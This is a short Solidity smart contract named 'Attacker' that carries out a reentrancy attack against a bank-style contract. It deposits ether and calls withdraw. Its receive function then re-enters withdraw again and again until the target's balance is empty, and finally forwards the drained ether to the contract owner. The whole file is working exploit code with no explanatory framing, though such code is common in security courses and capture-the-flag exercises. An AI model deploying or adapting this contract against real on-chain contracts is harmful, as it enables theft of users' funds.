// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBANK {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker is Ownable {
    IBANK public immutable bank;

    constructor(address _bank) {
        bank = IBANK(_bank);
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        } else {
            (bool sent, ) = payable(owner()).call{value: address(this).balance}(
                ""
            );
            require(sent, "Failed to send Ether");
        }
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}
